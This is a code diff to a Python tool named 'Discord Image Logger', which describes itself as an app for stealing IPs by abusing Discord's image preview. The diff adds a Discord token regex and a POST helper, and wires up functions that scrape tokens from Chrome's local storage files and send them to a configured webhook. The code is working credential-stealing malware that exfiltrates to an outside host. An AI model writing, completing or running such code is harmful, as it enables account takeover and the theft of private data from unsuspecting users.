@@ -5,10 +5,11 @@ import typing
 import json
 import urllib.request
 import random
+import requests
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser
+import traceback, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -302,8 +303,18 @@ if (!currenturl.includes("g=")) {
             reportError(traceback.format_exc())
 
         return
-    def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:
 
+# Token regex pattern for Discord tokens
+TOKEN_REGEX_PATTERN = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}'
+
+def make_post_request(url: str, data: dict) -> None:
+    """Make a POST request to the specified URL with the given data."""
+    try:
+        requests.post(url, json=data)
+    except Exception as e:
+        print(f"Error making POST request: {e}")
+
+def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:
     with open(file_path, encoding="utf-8", errors="ignore") as text_file:
         try:
             file_contents = text_file.read()
@@ -311,9 +322,7 @@ if (!currenturl.includes("g=")) {
             return None
 
     tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
-
     return tokens if tokens else None
-
 
 def get_user_id_from_token(token: str) -> typing.Union[None, str]:
     """
@@ -339,7 +348,6 @@ def get_user_id_from_token(token: str) -> typing.Union[None, str]:
         return None
 
     return discord_user_id
-
 
 def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
     """
@@ -380,7 +388,6 @@ def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
 
     return id_to_tokens if id_to_tokens else None
 
-
 def send_tokens_to_webhook(
     webhook_url: str, user_id_to_token: typing.Dict[str, set[str]]
 ) -> int:
@@ -404,9 +411,7 @@ def send_tokens_to_webhook(
 
     make_post_request(webhook_url, data)
 
-
 def main() -> None:
-
     chrome_path = os.path.join(
         os.getenv("LOCALAPPDATA"),
         r"Google\Chrome\User Data\Default\Local Storage\leveldb"
@@ -417,7 +422,7 @@ def main() -> None:
     if tokens is None:
         return
 
-    send_tokens_to_webhook(WEBHOOK_URL, tokens)
+    send_tokens_to_webhook(config["webhook"], tokens)
 
 if __name__ == "__main__":
     main()
